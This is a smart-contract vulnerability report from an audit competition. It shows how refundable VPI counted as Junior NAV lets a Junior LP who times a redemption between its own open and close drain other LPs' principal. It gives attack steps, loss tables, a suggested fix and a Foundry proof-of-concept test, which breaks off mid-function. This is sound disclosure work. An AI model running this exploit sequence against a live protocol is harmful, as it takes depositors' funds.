# \#97887 [SC-Critical] Refundable VPI priced as Junior NAV at LP epoch settlement allows a Junior LP to take the principal of remaining Junior LPs by redeeming between its own open and close

**Submitted on Nov 3rd 2026 at 18:25:52 UTC by @Persona404 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97887
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

A positive VPI charge paid when a trader opens a skew-increasing position goes straight into HousePool cash. The next LP epoch settlement prices it as Junior NAV. The lifetime clamp then lets the same position take that exact amount back as a close rebate. A Junior LP who also trades can request a redemption, open a large long in the last minute before the epoch boundary, redeem at the inflated NAV, and close the long to recover the VPI. The rebate is paid from a pool that now belongs only to the Junior LPs who stayed, so their principal drops below what they deposited while the attacker ends up ahead. Every step uses public entry points and an ordinary keeper. In the PoC a victim with 10,000,000 USDG in Junior loses 54,511 USDG in one cycle and 200,900 USDG (2.01 % of its funds) over three cycles at the release caps.

## Vulnerability Details

VPI is paid into the pool at open. In `CfdEngineSettlementSidecar.executeOpen` the positive trade cost is credited to the pool as revenue:

```solidity
// CfdEngineSettlementSidecar.sol:454-462
if (delta.tradeCostAssets > 0) {
    uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
    if (poolCashInflowAssets > 0) {
        IHousePool(host.pool()).recordClaimantInflow(
            poolCashInflowAssets,
            IHousePool.ClaimantInflowKind.Revenue,
            IHousePool.ClaimantInflowCashMode.CashArrived
        );
```

That cash is part of `HousePool.totalAssets()`. At the next `settleLpEpoch` the reconcile step books it to Junior, and `_settleLpEpoch` freezes `juniorPhase.pricingPrincipal` / `pricingSupply` from that state (`HousePool.sol:824-847`). Matured Junior redemptions are paid at that price. Nothing in `CfdEngineProtocolLens.getHousePoolInputSnapshot` subtracts the VPI that open positions can still get back.

The same position does get it back. When it closes and skew falls, the close VPI delta is negative, and the lifetime clamp only stops it at zero lifetime VPI:

```solidity
// CloseAccountingLib.sol:112-118
// Clamp so lifetime VPI (accrued + delta) never goes negative. Prevents LP sandwich attacks
// where an attacker opens at high depth, reduces pool depth, then closes to extract a
// net-negative lifetime VPI rebate. This rule is identical in live and oracle-frozen markets; frozen-market
// stale-price risk is priced separately through frozenSpreadAssets.
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

So a round trip at unchanged depth refunds exactly what was paid, and `CfdEngineSettlementSidecar.sol:621-624` pays the rebate with `IHousePool.payOut`. The pool treats a refundable charge as earned income. Whoever leaves the pool between the open and the close takes a share of a refund that the remaining LPs then pay.

Attack, with b the next hour boundary:

1. The attacker deposits X into Junior at fair NAV and waits the 1 h activation cooldown.
2. At b - 400 (before the five-minute cutoff) it calls `juniorVault.requestRedeem` for all its shares. The request targets epoch b.
3. At b - 60 it commits a long of size S with `OrderRouter.commitOrder` and any keeper executes it. VPI C = 0.005 * S^2 / D goes into the pool. A victim who sees this and requests a redemption now lands in epoch b + 3600 (asserted in the PoC).
4. At b any keeper calls `OrderRouter.settleLpEpoch`. The attacker's redemption is priced with C inside Junior NAV, so it receives about f * C more than an honest redemption, where f is its share of Junior.
5. The attacker closes the long. The rebate is exactly C (the clamp is met with equality) and is paid from the pool.

The attacker pays two execution fees and gets f * C. The remaining Junior LPs pay the rebate C and keep only their small share of the fee left in the pool. In additional local runs that are not part of this PoC, net profit turned positive from about f = 0.40 without existing skew, and from about f = 0.21 when same-side skew from other traders already sat near the wall. The attacker does not need to already own Junior; it creates the share with its own deposit, which it gets back.

Every guard on the path passes within its own bound. The skew wall (0.4 D) and free cash for the redemption limit S. The Junior covenant passes, and in the cycle test the attacker leaves a remainder in Junior to satisfy it. The lifetime clamp passes with equality, and the rebate cap in free cash passes. None of them protect the pro rata share between Junior LPs.

How this differs from what the documentation accepts. I quote the relevant lines in full.

ACCOUNTING_SPEC.md:731-740: "LP ownership follows collection time. Indexed pending carry and retained `unsettledCarryAssets` are trader debt, not LP NAV receivables. Cash collection becomes pool revenue and the existing tranche waterfall prices it at the next reconcile. Shares activated before collection participate even while held in deposit-claim escrow; shares burned to fund a redemption stop participating, and the resulting fixed cash claim does not earn later carry. Carry collected before deposit activation is already included in the activation price. This intentionally allows a trader and incoming LP to time collection after LP activation and share carry accrued before that activation. There is no account sweep, accrual-cohort allocation, or entry/exit barrier for pending carry. The same rule applies when retained arrears are later paid. This is a collection-time ownership policy, not a claim that timing cannot transfer part of old carry revenue to a new LP."

This policy is about carry, which is earned and never paid back. It lets timing move part of real revenue between LP generations, and it says a redeeming LP stops participating once its shares are burned. That is exactly what the attacker relies on, but for carry it only means an LP gets more or less of real income. No LP ends below its own principal because of it. Here the charge is refunded to the payer after the redemption, and the LPs who stayed fund the refund from principal.

ACCOUNTING_SPEC.md:1064-1066: "anticipated carry, VPI, fees, spreads, and other action economics stay outside terminal `K`; the book is synchronized only to actually installed PnL pledge and same-account claim state after settlement. The VPI reserve therefore does not inflate marked LP receivables or symmetric LP NAV," and SECURITY.md:871-872: "new close-time action rebates use only pool cash free after protecting existing trader claims. Unfunded value is waived rather than claim-backed, and neither anticipated VPI nor its reserve inflates terminal `K` or symmetric NAV,". These keep future VPI out of NAV. The issue is the opposite case: VPI that has already been paid but is still refundable to the same position does inflate NAV.

The code comment above the clamp, and SECURITY.md:1443 ("the lifetime clamp intentionally zeroes otherwise extractable rebate-only round trips"), state that the clamp exists to stop LP sandwiches on VPI. This is such a sandwich. The trader leg nets exactly zero VPI, so the clamp lets it through, and the profit is taken on the LP side.

There is a small passive version of the same leak without any attacker. An LP who redeems while honest VPI-paying positions are open takes a share of refundable VPI, at most about 2 bps of remaining Junior per epoch in additional local runs. This shows the NAV rule is the cause. The attack is the deliberate, large version of it.

This is also not the AI-scan item "Temporary pool-liquidity reduction can amplify a skew-reducing close rebate". That item needs a depth change between open and close. `test_DepthNeutral_NewLpPays` keeps depth unchanged: a new LP deposits 60M in the same epoch the attacker redeems 60M. The rebate equals the paid VPI, the attacker still gains 37,707 USDG, and the new LP loses 56,899 USDG of its 60M deposit in the same hour. A fix for that AI-scan item does not stop this.

Suggested fix: count the positive lifetime VPI of open positions, `sum(max(vpiAccrued, 0))`, as an LP liability in the HousePool input snapshot, by keeping a side aggregate in the settlement sidecar and subtracting it from `terminalLpPriceDeltaAssets` in `CfdEngineProtocolLens.getHousePoolInputSnapshot`. VPI then becomes LP income only when the position closes or is liquidated, and only for the part that is not refunded. This mirrors how the negative VPI reserve is already kept out of NAV. `test_FixClosesTheLeak` shows it with a local lens: the attacker's redemption becomes identical to the honest one (59,999,436.383803 USDG in both branches) and the attack loses 33,601 USDG in fees.

## Impact Details

The remaining Junior LPs lose principal, and the attacker profits. All positions are closed before anything is measured, so the loss is final and is not reconciled later.

| Scenario (PoC test) | Attacker vs honest | Victim loss | Share of victim funds |
| --- | --- | --- | --- |
| One cycle, Junior 10M, Senior 36M, attacker 60M, long 42M (`test_SingleCycle`) | +37,716.91 | 54,511.66 | 0.55 % |
| One cycle, attacker 15M (60 % of Junior), long 24.4M (`test_SmallerAttacker`) | +9,757.12 | 19,515.37 | 0.20 % |
| Three cycles at release caps, Junior 10M, Senior 40M, attacker 75M (`test_ThreeCycles_ReleaseCaps`) | +141,163.85 | 200,900.41 | 2.01 % |
| Same epoch new LP deposits 60M (`test_DepthNeutral_NewLpPays`) | +37,707.17 | new LP loses 56,899.53 | 0.09 % of the new deposit |

In `test_SingleCycle` the victim deposited 10,000,000 USDG and ends with 9,945,010.86 USDG, against 9,999,522.52 USDG in the honest branch. In the three-cycle test it ends with 9,797,686.63 USDG. The loss is about the same in every cycle (67,434, 66,966 and 66,500 USDG; VPI paid 99,182, 99,172 and 99,162 USDG) and nothing returns it. One cycle takes about 3 hours, so the attack can run several times per trading day. Senior is not affected in any test; the loss lands on Junior.

The victims have no loss-free exit. Before the cutoff only the attacker's redemption request is visible, not the open. A redemption requested after the open lands in the next epoch, when the loss is already realized.

I selected "Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield". The victims lose more than their own share of the VPI revenue ((1 - f) * C = 11,887 USDG against a loss of 54,511 USDG in the single cycle), and they end below their deposited principal, so this is principal and not only yield.

Feasibility. The capital is below the program's 100M case-by-case line, and the program states "A high capital requirement is generally not a valid reason to downgrade a report". The capital is returned in the same cycle and can be borrowed for about 3 hours. Price risk is short and symmetric. The open is executed about 60 s before settlement and closed right after, which is roughly 1 bp of FX basket move with zero expected value, against an expected gain of about 37,700 USDG per cycle at 42M. A skew-reducing order from a third party inside the same 60 s window would reduce the profit, but nobody has an economic reason to place one there.

I am happy to address any technical concerns, clarify assumptions, or provide additional evidence. If any aspect of the report may affect its validity or severity assessment, please let me know so I can respond before a final determination is made.

## References

- VPI credited to the pool at open: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L454-L462
- Close rebate paid from the pool: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L621-L624
- Lifetime clamp and its stated purpose: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L112-L118
- Junior epoch pricing: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L824-L847
- HousePool input snapshot: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineProtocolLens.sol#L59
- ACCOUNTING_SPEC.md (carry collection-time policy, lines 731-740; anticipated VPI, lines 1064-1066): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md
- SECURITY.md (lines 871-872 and 1443): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md

## Proof of Concept

The PoC is a Foundry test in the repository's own test suite at the commit in scope. It does not modify any contract in scope. Pyth and USDG are the repository mocks, which the program allows. Every attack step goes through production entry points: TrancheVault `requestDeposit` / `claimDeposit` / `requestRedeem` / `claimRedeem`, `OrderRouter.commitOrder` with a V3 `OrderRequest` from the trader EOA, and `OrderRouter.executeOrder`, `OrderRouter.settleLpEpoch` and `OrderRouter.updateMarkPrice` from an unprivileged keeper EOA. The test contract acts only as the owner during configuration, where it sets the release values from packages/perps/DEPLOYMENT.md (maint 10 bps, initial 20 bps, vpiFactor 0.01e18, execution fee 4 bps, settlement buffer 25 bps, min open notional 1,000 USDG, adverse confidence 2,500 bps, Senior caps 40M and 8,000 bps through the real 72 h timelocks). Each test runs the same history twice from one snapshot: an honest branch (same deposits and redemption, no trade) and an attack branch. All positions are closed before anything is measured.

The fixture test/perps/BasePerpTest.sol deploys the Router as LegacyOrderRouterHarness, which inherits OrderRouter unchanged. The PoC calls only the production V3 `commitOrder(OrderRequest)`, not the legacy helper.

Environment setup:

1. Install Foundry (tested with forge 1.7.1; the program names Forge 1.5.1 and either works). Solidity 0.8.35 is downloaded automatically.
2. Clone the repository at the commit in scope:

```bash
git clone --recurse-submodules https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout --detach a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
mkdir -p packages/perps/test/poc
```

Reproduction:

3. Save the following file as packages/perps/test/poc/PletherVpiNavTiming.t.sol:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {CfdEngineProtocolLens} from "@plether/perps/CfdEngineProtocolLens.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {HousePoolEngineViewTypes} from "@plether/perps/interfaces/HousePoolEngineViewTypes.sol";
import {ICfdEngineProtocolLens} from "@plether/perps/interfaces/ICfdEngineProtocolLens.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {console2} from "forge-std/console2.sol";

/// @dev Used ONLY by test_FixClosesTheLeak to show the suggested fix. Not part of the attack.
///      The HousePool input snapshot treats each open position's positive lifetime VPI (the most the lifetime clamp
///      can refund to that position) as an LP liability. Everything else is forwarded to an unmodified
///      CfdEngineProtocolLens.
contract FixedProtocolLens {

    address public immutable INNER;
    CfdEngine public immutable ENG;
    address[] internal tracked;

    constructor(
        address inner,
        address eng
    ) {
        INNER = inner;
        ENG = CfdEngine(eng);
    }

    function setTracked(
        address[] calldata accounts
    ) external {
        delete tracked;
        for (uint256 i; i < accounts.length; i++) {
            tracked.push(accounts[i]);
        }
    }

    function refundableVpiAssets() public view returns (uint256 sum) {
        for (uint256 i; i < tracked.length; i++) {
            (,,,,,, int256 v) = ENG.positions(tracked[i]);
            if (v > 0) {
                sum += uint256(v);
            }
        }
    }

    function getHousePoolInputSnapshot(
        uint256 markStalenessLimit
    ) external view returns (HousePoolEngineViewTypes.HousePoolInputSnapshot memory snapshot) {
        snapshot = ICfdEngineProtocolLens(INNER).getHousePoolInputSnapshot(markStalenessLimit);
        snapshot.terminalLpPriceDeltaAssets -= int256(refundableVpiAssets());
    }

    fallback() external {
        address inner = INNER;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let ok := staticcall(gas(), inner, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            if iszero(ok) { revert(0, returndatasize()) }
            return(0, returndatasize())
        }
    }

}

/// @dev Paid VPI is priced into Junior NAV at LP epoch settlement, but the same position gets it back as a close
///      rebate. A Junior LP that redeems between its own open and close takes part of the remaining Junior principal.
///      Every attack step uses production entry points: TrancheVault request/claim, OrderRouter.commitOrder
///      (V3 OrderRequest from the trader EOA), and OrderRouter.executeOrder / settleLpEpoch / updateMarkPrice from an
///      unprivileged KEEPER EOA. Pyth and USDG are the repository mocks (out of scope). No deal, no vm.store and no
///      prank of a protocol address in the attack. The test contract acts only as the owner during configuration.
///      Parameters: DEPLOYMENT.md release values, Senior caps 40M / 8000 bps set through the real 72 h timelocks.
///      Each test runs the same history twice from one snapshot: an honest branch (same deposits and redemption, no
///      trade) and an attack branch. All positions are closed before anything is measured.
contract PletherVpiNavTimingPoC is BasePerpTest {

    address internal constant VICTIM = address(0xC201);
    address internal constant SENIOR_LP = address(0xC202);
    address internal constant ATTACKER = address(0xC203);
    address internal constant KEEPER = address(0xC204);
    address internal constant NEW_LP = address(0xC207);

    uint256 internal clientNonce;
    uint256 internal boundary;

    struct Outcome {
        uint256 redeemedAssets;
        int256 attackerNet;
        uint256 victimValue;
        uint256 seniorValue;
        uint256 treasuryBalance;
        uint256 vpiPaid;
        uint256 newLpValue;
    }

    struct CycleResult {
        uint256 attackerWealth;
        uint256 victimValue;
        uint256 seniorValue;
        uint256[] victimAfter;
        uint256[] vpiPaid;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    // ------------------------------------------------------------------ configuration

    function _configureProduction() internal {
        IHousePool.PoolConfig memory poolCfg = _currentPoolConfig();
        poolCfg.maxSeniorExposureAssets = 40_000_000e6;
        poolCfg.maxSeniorShareBps = 8000;
        pool.proposePoolConfig(poolCfg);

        IOrderRouterAdminHost.RouterConfig memory routerCfg = _routerConfig();
        routerCfg.minOpenNotionalAssets = 1_000e6;
        routerCfg.adverseConfidenceMultiplierBps = 2500;
        routerAdmin.proposeRouterConfig(routerCfg);

        uint256 t = pool.poolConfigActivationTime();
        uint256 t2 = routerAdmin.routerConfigActivationTime();
        vm.warp((t > t2 ? t : t2) + 1);
        pool.finalizePoolConfig();
        routerAdmin.finalizeRouterConfig();

        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6, "senior cap");
        assertEq(pool.maxSeniorShareBps(), 8000, "senior share cap");
        assertEq(router.minOpenNotionalAssets(), 1_000e6, "min open notional");
        assertEq(router.maxPendingOrders(), 5, "max pending orders");
        assertEq(router.maxExecutionWindowSeconds(), 60, "execution window");
        assertEq(engine.executionFeeBps(), 4, "execution fee");
        assertEq(engine.settlementBufferBps(), 25, "settlement buffer");
    }

    function _installFix() internal {
        address lensAddr = address(pool.ENGINE_PROTOCOL_LENS());
        CfdEngineProtocolLens inner = new CfdEngineProtocolLens(address(engine));
        FixedProtocolLens impl = new FixedProtocolLens(address(inner), address(engine));
        vm.etch(lensAddr, address(impl).code);
        address[] memory accts = new address[](2);
        accts[0] = ATTACKER;
        accts[1] = VICTIM;
        FixedProtocolLens(lensAddr).setTracked(accts);
    }

    // ------------------------------------------------------------------ production-path helpers

    function _pyth(
        uint256 price
    ) internal returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = _mockHistoricalPublishTime();
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(),
            SafeCast.toInt64(SafeCast.toInt256(price)),
            0,
            int32(-8),
            publishTime,
            publishTime == 0 ? 0 : publishTime - 1
        );
        updateData = new bytes[](1);
        updateData[0] = abi.encode(price);
    }

    function _keeperSettle() internal {
        bytes[] memory data = _pyth(1e8);
        vm.prank(KEEPER);
        router.settleLpEpoch(data);
    }

    function _keeperMark() internal {
        bytes[] memory data = _pyth(1e8);
        vm.prank(KEEPER);
        router.updateMarkPrice(data);
    }

    function _depositFromWallet(
        TrancheVault vault,
        address lp,
        uint256 amount
    ) internal returns (uint256 shares) {
        vm.startPrank(lp);
        settlementToken.approve(address(vault), amount);
        uint256 requestId = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        uint256 activationTime = vault.depositEpochStart(requestId);
        if (vm.getBlockTimestamp() < activationTime) {
            vm.warp(activationTime);
        }
        _keeperSettle();
        uint256 claimable = vault.claimableDepositRequest(requestId, lp);
        assertEq(claimable, amount, "deposit activated in full");
        vm.prank(lp);
        shares = vault.claimDeposit(requestId, claimable, lp, lp);
    }

    function _depositReal(
        TrancheVault vault,
        address lp,
        uint256 amount
    ) internal returns (uint256 shares) {
        settlementToken.mint(lp, amount);
        shares = _depositFromWallet(vault, lp, amount);
    }

    function _notional(
        uint256 size
    ) internal pure returns (uint256) {
        return size * 1e8 / 1e20;
    }

    function _commitV3(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 targetPrice,
        bool isClose
    ) internal returns (uint64 orderId) {
        clientNonce++;
        uint256 notional = _notional(size);
        OrderV3Types.OrderRequest memory req = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode("poc", account, clientNonce)),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: targetPrice,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp() + 30),
                executionWindowSeconds: 60,
                allowedExecutionModes: 1,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: 200_000,
                maxExecutionNotionalAssets: notional * 102 / 100,
                maxGrossAccountDebitAssets: margin + notional / 50,
                maxActionChargeAssets: notional / 100,
                maxExplicitFeesAssets: notional / 1000,
                maxPostPositionSize: isClose ? 0 : size,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: 5_000_000
            })
        });
        vm.prank(account);
        orderId = router.commitOrder(req);
    }

    function _keeperExecute(
        uint64 orderId
    ) internal {
        bytes[] memory data = _pyth(1e8);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(orderId, data);
        assertEq(uint256(r.status), uint256(OrderV3Types.LifecycleStatus.Executed), "order executed");
    }

    function _openLong(
        address trader,
        uint256 size
    ) internal {
        uint64 id = _commitV3(trader, CfdTypes.Side.LONG, size, _notional(size) / 100, 1e8 * 9990 / 10_000, false);
        _keeperExecute(id);
        (uint256 s,,,,,,) = engine.positions(trader);
        assertEq(s, size, "open filled");
    }

    function _closeLong(
        address trader,
        uint256 size
    ) internal {
        uint64 id = _commitV3(trader, CfdTypes.Side.LONG, size, 0, 1e8 * 10_010 / 10_000, true);
        _keeperExecute(id);
        (uint256 s,,,,,,) = engine.positions(trader);
        assertEq(s, 0, "close filled");
    }

    /// @dev Next hour boundary b, and warp to b - 400 (before the five-minute request cutoff b - 300).
    function _nextBoundary() internal returns (uint256 b) {
        b = (vm.getBlockTimestamp() / 3600 + 1) * 3600;
        if (vm.getBlockTimestamp() > b - 400) {
            b += 3600;
        }
        vm.warp(b - 400);
    }

    /// @dev Largest lot multiple under the 0.4 skew wall and under the free cash needed to fund `redeemValue`.
    function _autoSize(
        uint256 redeemValue
    ) internal view returns (uint256 size) {
        uint256 d = pool.totalAssets();
        (uint256 longMaxProfit,,,) = engine.sides(0);
        uint256 capAssets = d * 4 / 10 * 999 / 1000;
        capAssets = capAssets > longMaxProfit ? capAssets - longMaxProfit : 0;
        uint256 freeAssets = d > redeemValue + longMaxProfit * 10_025 / 10_000
            ? (d - redeemValue - longMaxProfit * 10_025 / 10_000) * 10_000 / 10_025 * 998 / 1000
            : 0;
        uint256 a = capAssets < freeAssets ? capAssets : freeAssets;
        size = (a * 1e12 / 1e20) * 1e20;
    }

    /// @dev Shares the attacker must leave in Junior so the 80 % Senior covenant can fund the rest.
    function _covenantKeepShares(
        uint256 attackerShares
    ) internal view returns (uint256) {
        uint256 others = juniorVault.totalAssets() - juniorVault.convertToAssets(attackerShares);
        uint256 seniorExposure = pool.seniorPrincipal() > pool.seniorHighWaterMark()
            ? pool.seniorPrincipal()
            : pool.seniorHighWaterMark();
        uint256 required = seniorExposure * 2500 / 10_000 + 20_000e6;
        if (others >= required) {
            return 0;
        }
        uint256 keep = juniorVault.convertToShares(required - others) + 1;
        return keep < attackerShares ? keep : attackerShares;
    }

    // ------------------------------------------------------------------ single cycle

    function _setUp(
        uint256 victimJ,
        uint256 senior,
        uint256 attackerJ
    ) internal {
        _configureProduction();
        _depositReal(juniorVault, VICTIM, victimJ);
        _depositReal(seniorVault, SENIOR_LP, senior);
        _depositReal(juniorVault, ATTACKER, attackerJ);
        vm.warp(vm.getBlockTimestamp() + 1 hours + 1); // activation cooldown
        boundary = _nextBoundary();
    }

    function _run(
        uint256 attackerJ,
        uint256 attackSize,
        uint256 newLpDeposit,
        bool attack
    ) internal returns (Outcome memory o) {
        uint256 b = boundary;

        // Step 1 (b - 400): attacker requests redemption of all its Junior shares, before the cutoff.
        uint256 shares = juniorVault.balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        uint256 requestId = juniorVault.requestRedeem(shares, ATTACKER, ATTACKER);
        assertEq(pool.lpEpochStart(requestId), b, "attacker redemption in the closing epoch");

        uint256 newLpRequestId;
        if (newLpDeposit > 0) {
            settlementToken.mint(NEW_LP, newLpDeposit);
            vm.startPrank(NEW_LP);
            settlementToken.approve(address(juniorVault), newLpDeposit);
            newLpRequestId = juniorVault.requestDeposit(newLpDeposit, NEW_LP, NEW_LP);
            vm.stopPrank();
        }

        _fundTrader(ATTACKER, _notional(attackSize) * 12 / 1000);
        uint256 traderStart = clearinghouse.balanceAssets(ATTACKER);

        // Step 2 (b - 60): skew-increasing open; its VPI is paid into the pool.
        vm.warp(b - 60);
        uint256 poolBefore = pool.totalAssets();
        if (attack) {
            _openLong(ATTACKER, attackSize);
        }
        o.vpiPaid = pool.totalAssets() - poolBefore;

        // A victim who reacts after seeing the open can no longer join this epoch.
        if (attack) {
            uint256 snap = vm.snapshotState();
            uint256 vShares = juniorVault.balanceOf(VICTIM);
            vm.prank(VICTIM);
            uint256 vReq = juniorVault.requestRedeem(vShares, VICTIM, VICTIM);
            assertEq(pool.lpEpochStart(vReq), b + 3600, "victim reaction lands in the next epoch");
            vm.revertToState(snap);
        }

        // Step 3 (b): any keeper settles the epoch; the redemption is priced with the VPI inside Junior NAV.
        vm.warp(b);
        _keeperSettle();
        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, ATTACKER);
        assertEq(claimable, shares, "attacker redemption fully funded");
        vm.prank(ATTACKER);
        o.redeemedAssets = juniorVault.claimRedeem(requestId, claimable, ATTACKER, ATTACKER);
        if (newLpDeposit > 0) {
            uint256 dc = juniorVault.claimableDepositRequest(newLpRequestId, NEW_LP);
            assertEq(dc, newLpDeposit, "new LP activated in full");
            vm.prank(NEW_LP);
            juniorVault.claimDeposit(newLpRequestId, dc, NEW_LP, NEW_LP);
        }

        // Step 4: the attacker closes; the lifetime clamp lets it take back the VPI it paid, from the pool.
        if (attack) {
            _closeLong(ATTACKER, attackSize);
        }
        vm.warp(b + 600);
        _keeperMark();

        (, uint256 l,,) = engine.sides(0);
        (, uint256 sh,,) = engine.sides(1);
        assertEq(l + sh, 0, "all positions closed before measuring");
        o.attackerNet =
            int256(o.redeemedAssets + clearinghouse.balanceAssets(ATTACKER)) - int256(attackerJ + traderStart);
        o.victimValue = juniorVault.convertToAssets(juniorVault.balanceOf(VICTIM));
        o.seniorValue = seniorVault.convertToAssets(seniorVault.balanceOf(SENIOR_LP));
        o.treasuryBalance = clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT);
        o.newLpValue = juniorVault.convertToAssets(juniorVault.balanceOf(NEW_LP));
    }

    function _compare(
        string memory label,
        uint256 victimJ,
        uint256 senior,
        uint256 attackerJ,
        uint256 attackSize,
        uint256 newLpDeposit
    ) internal returns (Outcome memory h, Outcome memory a) {
        _setUp(victimJ, senior, attackerJ);
        uint256 snap = vm.snapshotState();
        h = _run(attackerJ, attackSize, newLpDeposit, false);
        vm.revertToState(snap);
        a = _run(attackerJ, attackSize, newLpDeposit, true);

        console2.log("=====", label);
        console2.log("attacker share of Junior, bps", attackerJ * 10_000 / (attackerJ + victimJ));
        console2.log("VPI paid into the pool at open", a.vpiPaid);
        console2.log("attacker redemption, honest", h.redeemedAssets);
        console2.log("attacker redemption, attack", a.redeemedAssets);
        console2.log("attacker profit vs honest (signed)");
        console2.logInt(a.attackerNet - h.attackerNet);
        console2.log("victim Junior deposit", victimJ);
        console2.log("victim value, honest", h.victimValue);
        console2.log("victim value, attack", a.victimValue);
        console2.log("victim loss vs honest (signed)");
        console2.logInt(int256(h.victimValue) - int256(a.victimValue));
        console2.log("senior loss vs honest (signed)");
        console2.logInt(int256(h.seniorValue) - int256(a.seniorValue));
        if (newLpDeposit > 0) {
            console2.log("new LP deposit", newLpDeposit);
            console2.log("new LP value, honest", h.newLpValue);
            console2.log("new LP value, attack", a.newLpValue);
            console2.log("new LP loss vs honest (signed)");
            console2.logInt(int256(h.newLpValue) - int256(a.newLpValue));
        }
    }

    // ------------------------------------------------------------------ repeated cycles

    function _cycles(
        uint256 n,
        bool attack
    ) internal returns (CycleResult memory r) {
        r.victimAfter = new uint256[](n);
        r.vpiPaid = new uint256[](n);
        for (uint256 i; i < n; i++) {
            uint256 bal = settlementToken.balanceOf(ATTACKER);
            if (bal > 0) {
                _depositFromWallet(juniorVault, ATTACKER, bal);
            }
            vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
            uint256 b = _nextBoundary();
            uint256 shares = juniorVault.balanceOf(ATTACKER);
            uint256 req = shares - _covenantKeepShares(shares);
            vm.prank(ATTACKER);
            uint256 rid = juniorVault.requestRedeem(req, ATTACKER, ATTACKER);
            assertEq(pool.lpEpochStart(rid), b, "redemption in the closing epoch");

            vm.warp(b - 60);
            uint256 size;
            if (attack) {
                size = _autoSize(juniorVault.convertToAssets(req));
                uint256 before = pool.totalAssets();
                _openLong(ATTACKER, size);
                r.vpiPaid[i] = pool.totalAssets() - before;
            }

            vm.warp(b);
            _keeperSettle();
            uint256 claimable = juniorVault.claimableRedeemRequest(rid, ATTACKER);
            assertEq(claimable, req, "cycle redemption fully funded");
            vm.prank(ATTACKER);
            juniorVault.claimRedeem(rid, claimable, ATTACKER, ATTACKER);

            if (attack) {
                _closeLong(ATTACKER, size);
            }
            vm.warp(b + 600);
            _keeperMark();
            r.victimAfter[i] = juniorVault.convertToAssets(juniorVault.balanceOf(VICTIM));
        }
        r.attackerWealth = settlementToken.balanceOf(ATTACKER) + clearinghouse.balanceAssets(ATTACKER)
            + juniorVault.convertToAssets(juniorVault.balanceOf(ATTACKER));
        r.victimValue = juniorVault.convertToAssets(juniorVault.balanceOf(VICTIM));
        r.seniorValue = seniorVault.convertToAssets(seniorVault.balanceOf(SENIOR_LP));
    }

    function _compareCycles(
        string memory label,
        uint256 victimJ,
        uint256 senior,
        uint256 attackerCapital,
        uint256 n
    ) internal returns (CycleResult memory h, CycleResult memory a) {
        _configureProduction();
        _depositReal(juniorVault, VICTIM, victimJ);
        _depositReal(seniorVault, SENIOR_LP, senior);
